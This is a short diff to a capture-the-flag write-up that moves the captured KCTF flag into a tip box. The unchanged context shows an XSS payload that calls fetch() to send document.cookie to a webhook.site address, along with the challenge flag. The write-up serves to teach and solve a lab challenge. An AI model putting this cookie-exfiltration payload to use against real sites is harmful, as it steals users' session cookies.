@@ -124,6 +124,8 @@ At this point you have to have your server open, I just combined Python's `http.
 fetch('https://webhook.site/74730694-2b7b-4bf6-ad99-93398c6a38c6?c=' + document.cookie);
 ```
 
-> Flag: `https://webhook/?c=flag=KCTF{f1lt3rs_c4n_b3_byp4ass3d_1f_br0k3n}`
+::: tip Flag
+`https://webhook/?c=flag=KCTF{f1lt3rs_c4n_b3_byp4ass3d_1f_br0k3n}`
+:::
 
 Your browser may complain that request is invalid, but the bot shouldn't have such  restrictions so just send the url to bot and get flag. 
